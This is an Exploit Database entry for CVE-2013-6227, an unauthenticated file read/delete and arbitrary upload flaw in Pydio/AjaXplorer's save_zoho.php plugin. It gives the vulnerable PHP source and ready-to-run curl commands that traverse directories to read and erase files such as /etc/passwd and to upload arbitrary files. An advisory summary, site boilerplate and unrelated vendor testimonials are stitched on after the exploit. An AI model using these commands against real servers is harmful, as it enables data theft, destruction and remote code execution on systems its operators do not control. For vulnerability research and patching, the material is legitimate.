# Exploit Title: Unauthenticated Arbitrary File Upload Vulnerability In Pydio/AjaXplorer 5.0.3 – 3.3.5
# Date: 01/18/2019
# Exploit Author: @_jazz______
# Vendor Homepage: https://pydio.com/
# Software Link: https://sourceforge.net/projects/ajaxplorer/files/ajaxplorer/stable-channel/4.2.3/ajaxplorer-core-4.2.3.tar.gz/download
# Version: ajaXplorer before 5.0.4
# Tested on: ajaXplorer 4.2.3 on Debian 9 update 5
# References: https://web.archive.org/web/20140430075145/http://www.redfsec.com/CVE-2013-6227
# CVE: CVE-2013-6227
###########################################################################################
Affected file:
/plugins/editor.zoho/agent/save_zoho.php

<?php

  $vars = array_merge($_GET, $_POST);

  if(!isSet($vars["ajxp_action"]) && isset($vars["id"]) && isset($vars["format"])){
    $filezoho = $_FILES['content']["tmp_name"];
    $cleanId = str_replace(array("..", "/"), "", $vars["id"]);
    move_uploaded_file($filezoho, "files/".$cleanId.".".$vars["format"]);
 }else if($vars["ajxp_action"] == "get_file" && isSet($vars["name"])){
    if(file_exists("files/".$vars["name"])){
      readfile("files/".$vars["name"]);
      unlink("files/".$vars["name"]);
    }
  }

?>

Option 1: If "ajxp_action" is not set, upload "content" file to files/id.format.
The code does not sanitize "format" parameter before passing it as an argument to "move_uploaded_file",
thus introducing an opportunity to upload files to any arbitrary location via directory traversal
Note: User should have permission to write on the desired location.

Option 2: If "ajxp_action" is set to "get_file", read the file from "files/name" and then ERASE IT (unlink).
Again, the code does not sanitize the "name" parameter, making it also vulnerable to directory traversal.

"files" directory's location is by default /plugins/editor.zoho/agent/files
A default location for reading/uploading files is /data/files/
###########################################################################################

[1] [CAUTION!] Read arbitrary files
curl "http://<url>/<ajaxplorer_wwwroot>/plugins/editor.zoho/agent/save_zoho.php?ajxp_action=get_file&name=<file_relative_path>"

e.g. curl "http://muralito.el.payaso/ajaxplorer/plugins/editor.zoho/agent/save_zoho.php?ajxp_action=get_file&name=../../../../../../../../etc/passwd"

[USE WITH CAUTION] This is a destructive function. Files retrieved WILL be erased after reading, provided that the file is writable by the user which the web server's process is running as.

[2] Arbitrary File Upload
*step 1 - Upload the file to the server*
# curl -F 'content=@<filename_from_attacker_host>;type=<filetype>;filename=\"<filename>\"' "http://<url>/<ajaxplorer_wwwroot>/plugins/editor.zoho/agent/save_zoho.php?id=&format=<upload_to_file_relative_path>"

e.g. # curl -F 'content=@test.html;type=text/html;filename=\"test.html\"' "http://muralito.el.payaso/ajaxplorer/plugins/editor.zoho/agent/save_zoho.php?id=&format=./../../../data/files/test.html"

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# Arbitrary Upload Vulnerability In Pydio/AjaXplorer 5.0.3 â 3.3.5

#### Background:

Pydio allows you to instantly turn any server into a powerful file sharing platform. Formerly known as AjaXplorer

#### Description of vulnerability:

There is an unrestricted upload capability, in one of the plugins that is distributed with Pydio 5.0.3 core to AjaXplorer 3.3.5.

An attacker may use this vulnerability to upload arbitrary files in a location that an attacker can control, and will allow remote code execution on the server.

#### Details:

/plugins/editor.zoho/agent/save\_zoho.php

The uploaded file through $\_FILES to save\_zoho.php will be moved to a path that the user can control with the format parameter passed from the user. Because the file formats allowed are not restricted, and is also used in a move path, this can be used to upload arbitrary files to the server.

Exploiting this vulnerability does not require authentication.

#### CVE:

The Common Vulnerabilities and Exposures (CVE) project has assigned CVE-2013-6227 to this issue. This is a candidate for inclusion in the CVE list.

#### Vendor Response:

Upgrade to Pydio v5.0.4 or higher.
http://pyd.io/pydio-core-5-0-4/

October 13, 2013: Vulnerability identified

## What Customers Say About Pydio

Transparent Background:

Pydio helped us solve many regulatory compliance issues. We needed a fast-to-deploy on-premise solution to allow auditable file exchanges with our customers and Pydio really fits the bill. Pydio's premium remote support was the cherry on the cake.

Dimitri R - Security & System administrator at major Insurance company

We've been using Pydio for years now and the platform has always met our needs for end user experience and advanced security. Today we have more than 10 Pydio instances and they are at the heart of our customer data exchanges. Moreover, GDPR has strengthened our desire to control our data and Pydio responds very well to this need.

Jeremy Godefroy - Deputy IT Manager at Inter Public Group

We’ve been using Pydio Cells at CY Cergy Paris Université as a sovereign solution for our research staff since early 2019. Following the increased need for collaboration during the Covid19 crisis, we opened the tool to all university staff. It meets our needs very well and is easy to learn. The granular access management via the 'Cells' concept is very flexible and efficient.
